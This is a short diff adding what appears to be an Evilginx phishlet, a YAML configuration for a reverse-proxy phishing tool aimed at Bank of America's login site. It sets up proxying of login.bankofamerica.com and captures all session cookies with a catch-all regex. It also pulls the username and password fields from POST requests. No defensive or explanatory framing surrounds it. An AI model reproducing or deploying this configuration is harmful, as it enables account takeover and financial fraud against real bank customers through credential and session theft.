@@ -1,0 +1,21 @@
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'bankofamerica.com', session: true, is_landing: true}
+sub_filters:
+auth_tokens:
+  - domain: '.bankofamerica.com'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/landingv2'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)' # regex in the event the date needs to be extracted
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.bankofamerica.com' # updated to match the proxy_hosts domain
+  path: '/' #path to where the login is, on the domain
